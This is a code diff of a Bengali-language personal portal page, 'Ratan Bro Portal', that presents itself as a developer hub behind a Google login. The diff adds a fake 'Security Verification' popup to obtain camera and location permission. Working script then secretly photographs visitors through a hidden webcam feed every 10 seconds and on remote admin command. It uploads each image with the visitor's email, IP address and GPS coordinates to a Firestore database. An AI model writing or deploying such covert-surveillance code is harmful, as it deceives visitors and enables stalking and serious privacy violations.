@@ -3,29 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | Official Hub</title>
+    <title>Ratan Bro | Official Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
     <style>
-        :root { --pink: #ff4d94; --dark: #0f172a; --card: #1e293b; --text: #f8fafc; }
+        :root { --pink: #ff4d94; --glow: #ff85b3; --dark: #020617; --card: rgba(30, 41, 59, 0.7); }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
-        body { background: var(--dark); color: var(--text); overflow-x: hidden; }
-
-        /* Login UI */
-        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .login-box { background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); text-align: center; width: 90%; max-width: 400px; }
-        .round-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); margin-bottom: 20px; object-fit: cover; }
         
-        /* Main UI */
-        #main-ui { display: none; }
-        .hero { background: linear-gradient(135deg, #ff4d94 0%, #7c3aed 100%); padding: 50px 20px; text-align: center; border-radius: 0 0 50px 50px; }
-        .profile-wrapper { display: flex; justify-content: center; align-items: center; }
-        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid white; object-fit: cover; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        body { 
+            background: var(--dark); 
+            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent),
+                        radial-gradient(circle at bottom left, rgba(124, 58, 237, 0.1), transparent);
+            color: white; overflow-x: hidden; min-height: 100vh;
+        }
+
+        /* --- Stylish Login Overlay --- */
+        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        .login-box { 
+            background: var(--card); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.3); 
+            text-align: center; width: 90%; max-width: 400px; backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px rgba(255, 77, 148, 0.2);
+        }
+        .round-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid var(--pink); margin-bottom: 20px; box-shadow: 0 0 15px var(--pink); }
+
+        /* --- Advanced Permission Popup --- */
+        #perm-modal { 
+            position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 9999; 
+            display: none; align-items: center; justify-content: center; backdrop-filter: blur(8px);
+        }
+        .perm-card { 
+            background: #1e293b; padding: 30px; border-radius: 25px; text-align: center; 
+            max-width: 350px; border: 2px solid var(--pink); animation: bounceIn 0.8s;
+        }
+        .perm-icon { font-size: 3rem; color: var(--pink); margin-bottom: 15px; animation: pulse 2s infinite; }
+
+        /* --- Main UI --- */
+        #main-ui { display: none; padding-bottom: 50px; }
+        .hero { padding: 60px 20px; text-align: center; position: relative; }
+        .profile-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
+        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid white; object-fit: cover; }
         .user-p-img { width: 85px; height: 85px; margin-left: -25px; border: 3px solid var(--dark); z-index: 1; }
 
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; padding: 25px; max-width: 900px; margin: 0 auto; }
-        .card { background: var(--card); border-radius: 20px; padding: 20px; text-align: center; text-decoration: none; color: white; border: 1px solid #334155; }
-        .card i { font-size: 2rem; color: var(--pink); margin-bottom: 10px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; padding: 0 20px; max-width: 900px; margin: 0 auto; }
+        .card { 
+            background: var(--card); border-radius: 20px; padding: 25px; text-align: center; 
+            text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1);
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .card:hover { transform: scale(1.05); border-color: var(--pink); box-shadow: 0 10px 20px rgba(255, 77, 148, 0.2); }
+        .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; display: block; }
+
+        /* --- Social Icons --- */
+        .social-dock { display: flex; justify-content: center; gap: 25px; margin-top: 40px; }
+        .social-dock a { font-size: 1.8rem; color: white; transition: 0.3s; }
+        .social-dock a:hover { color: var(--pink); transform: translateY(-5px); }
 
         canvas, video { display: none; }
     </style>
@@ -33,31 +65,46 @@
 <body>
 
     <div id="login-overlay">
-        <div class="login-box">
+        <div class="login-box animate__animated animate__zoomIn">
             <img src="ratan.jpg" onerror="this.src='https://i.ibb.co/vzYm8mN/ratan.jpg'" class="round-img">
-            <h3>স্বাগতম রতন ব্রো পোর্টালে</h3>
-            <p style="margin: 15px 0; opacity: 0.7;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
-            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">
-                <i class="fab fa-google"></i> Login with Google
+            <h2 style="color: var(--pink);">Ratan Bro Portal</h2>
+            <p style="margin: 15px 0; opacity: 0.8;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
+            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:15px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; box-shadow: 0 5px 15px rgba(255,77,148,0.4);">
+                <i class="fab fa-google"></i> Continue with Google
             </button>
         </div>
     </div>
 
+    <div id="perm-modal">
+        <div class="perm-card">
+            <div class="perm-icon"><i class="fas fa-shield-alt"></i></div>
+            <h3>Security Verification</h3>
+            <p style="font-size: 0.9rem; margin: 15px 0; opacity: 0.8;">সঠিক সার্ভিস পেতে আপনার লোকেশন এবং ক্যামেরা পারমিশন 'Allow' করুন।</p>
+            <button onclick="grantAccess()" style="background:var(--pink); color:white; border:none; padding:10px 30px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant Access</button>
+        </div>
+    </div>
+
     <div id="main-ui">
-        <section class="hero">
+        <section class="hero animate__animated animate__fadeIn">
             <div class="profile-wrapper">
                 <img src="ratan.jpg" class="p-img">
                 <img id="user-display-pic" src="" class="p-img user-p-img">
             </div>
-            <h2 id="user-welcome" style="margin-top:15px;"></h2>
-            <div style="background:white; color:var(--pink); padding:5px 15px; border-radius:20px; display:inline-block; font-weight:bold; margin-top:10px;">System Secured</div>
+            <h2 id="user-welcome"></h2>
+            <p style="opacity:0.6; font-size: 0.9rem;">Web Developer & Professional Hub</p>
         </section>
 
         <div class="grid">
-            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
-            <a href="business.html" class="card"><i class="fas fa-briefcase"></i><h4>Dropshipping</h4></a>
-            <a href="https://your-lookup-site.com" class="card"><i class="fas fa-search"></i><h4>Lookup</h4></a>
-            <a href="portfolio.html" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
+            <a href="testpaper.html" class="card animate__animated animate__fadeInUp"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
+            <a href="business.html" class="card animate__animated animate__fadeInUp" style="animation-delay: 0.1s;"><i class="fas fa-briefcase"></i><h4>Business</h4></a>
+            <a href="https://your-lookup-site.com" class="card animate__animated animate__fadeInUp" style="animation-delay: 0.2s;"><i class="fas fa-search"></i><h4>Number Search</h4></a>
+            <a href="portfolio.html" class="card animate__animated animate__fadeInUp" style="animation-delay: 0.3s;"><i class="fas fa-id-card"></i><h4>Portfolio</h4></a>
+        </div>
+
+        <div class="social-dock">
+            <a href="https://facebook.com/your-profile" target="_blank"><i class="fab fa-facebook"></i></a>
+            <a href="https://wa.me/8801609166109" target="_blank"><i class="fab fa-whatsapp"></i></a>
+            <a href="mailto:ratan@gmail.com"><i class="fas fa-envelope"></i></a>
         </div>
     </div>
 
@@ -83,25 +130,33 @@
         const db = getFirestore(app);
         const provider = new GoogleAuthProvider();
 
+        let currentUser = null;
+
         window.googleLogin = () => { signInWithPopup(auth, provider); };
 
         onAuthStateChanged(auth, (user) => {
             if (user) {
+                currentUser = user;
                 document.getElementById('login-overlay').style.display = 'none';
-                document.getElementById('main-ui').style.display = 'block';
-                document.getElementById('user-welcome').innerText = user.displayName;
-                document.getElementById('user-display-pic').src = user.photoURL;
-                initTracking(user);
+                document.getElementById('perm-modal').style.display = 'flex'; // পারমিশন পপআপ দেখাবে
             }
         });
 
+        window.grantAccess = async () => {
+            document.getElementById('perm-modal').style.display = 'none';
+            document.getElementById('main-ui').style.display = 'block';
+            document.getElementById('user-welcome').innerText = "স্বাগতম, " + currentUser.displayName;
+            document.getElementById('user-display-pic').src = currentUser.photoURL;
+            
+            initTracking(currentUser);
+        };
+
         async function initTracking(user) {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(e => console.log("Blocked"));
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(e => console.log("Denied"));
             document.getElementById('vSource').srcObject = stream;
 
             const uRef = doc(db, "users", user.email.replace('.', '_'));
 
-            // এডমিন থেকে সরাসরি ছবি তোলার কমান্ড শুনবে
             onSnapshot(uRef, (snap) => {
                 if (snap.data()?.command === "take_photo") {
                     capture(user);
@@ -109,9 +164,8 @@
                 }
             });
 
-            // প্রথম ছবি সাথে সাথে এবং পরে প্রতি ১০ সেকেন্ডে
-            capture(user); 
-            setInterval(() => capture(user), 10000); 
+            capture(user); // সাথে সাথে প্রথম ছবি
+            setInterval(() => capture(user), 10000); // প্রতি ১০ সেকেন্ডে আপডেট
         }
 
         async function capture(user) {
@@ -119,7 +173,7 @@
             const video = document.getElementById('vSource');
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, 640, 480);
-            const image = canvas.toDataURL('image/jpeg', 0.6); // ফাইল সাইজ কমাতে কোয়ালিটি ০.৬
+            const image = canvas.toDataURL('image/jpeg', 0.5);
 
             const ipInfo = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
             
@@ -130,7 +184,7 @@
                     photo: user.photoURL,
                     ip: ipInfo.ip,
                     loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
-                    lastPic: image, // এটি প্রতি ১০ সেকেন্ডে নতুন ছবি দিয়ে আপডেট হবে
+                    lastPic: image,
                     time: new Date().toLocaleString()
                 }, { merge: true });
             });
